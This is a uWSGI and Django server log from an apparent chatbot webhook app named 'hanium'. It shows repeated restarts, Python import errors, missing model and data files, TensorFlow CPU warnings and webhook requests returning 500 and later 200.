  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:34:38 2020] POST /webhook/ => generated 114346 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 2/2] 223.194.169.151 () {50 vars in 873 bytes} [Thu Aug 27 06:34:42 2020] GET / => generated 115063 bytes in 72 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 3/3] 223.194.169.151 () {48 vars in 791 bytes} [Thu Aug 27 06:34:42 2020] GET /favicon.ico => generated 130886 bytes in 77 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:58:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564b8a34cd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x564b8a34cd00 pid: 4670 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4670, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 97
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4670|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:58:47 2020] POST /webhook/ => generated 114340 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:59:15 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x556b2b1f8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556b2b1f8d00 pid: 4676 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4676, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 97
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4676|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:59:19 2020] POST /webhook/ => generated 114340 bytes in 75 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 07:00:55 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564bb4b39d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564bb4b39d00 pid: 4685 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4685, cores: 1)
[pid: 4685|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 07:00:59 2020] POST /webhook/ => generated 85 bytes in 5 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 4685)...
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 07:20:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5612903dcd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5612903dcd00 pid: 6140 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 6140, cores: 1)
2020-08-28 07:20:28.449790: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 07:20:28.449823: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 9, in <module>
    from . import nlp
  File "./haniumapp/nlp.py", line 23, in <module>
    f = open('list_data.csv','r')
FileNotFoundError: [Errno 2] No such file or directory: 'list_data.csv'
[pid: 6140|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 07:20:27 2020] POST /webhook/ => generated 128202 bytes in 3175 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 07:25:12 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560ce46a3d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560ce46a3d00 pid: 6191 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 6191, cores: 1)
2020-08-28 07:25:49.637764: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 07:25:49.637797: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 9, in <module>
    from . import nlp
  File "./haniumapp/nlp.py", line 62, in <module>
    loaded_model = load_model('best_model.h5')
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: best_model.h5/{saved_model.pbtxt|saved_model.pb}
Fri Aug 28 07:26:04 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.249.84.13) !!!
Fri Aug 28 07:26:04 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.249.84.13)
OSError: write error
[pid: 6191|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 07:25:49 2020] POST /webhook/ => generated 32611 bytes in 15160 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)


*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 11:59:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56296b372cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56296b372cf0 pid: 1673 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1673, cores: 1)
2020-08-28 11:59:35.336388: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 11:59:35.336426: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-08-28 11:59:46.120838: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 11:59:46.120870: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 11:59:46.120890: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 11:59:46.121106: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 11:59:46.159039: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 11:59:46.159485: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x562970266350 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 11:59:46.159504: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 11:59:46.527320: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 11:59:46.528808: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 11:59:46.530183: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '']
['', '', '']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
2020-08-28 11:59:50.866559: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 11:59:51.200895: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 11:59:51.202346: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 11:59:51.203763: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 1673|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 11:59:34 2020] POST /webhook/ => generated 38 bytes in 17200 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:01:47 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
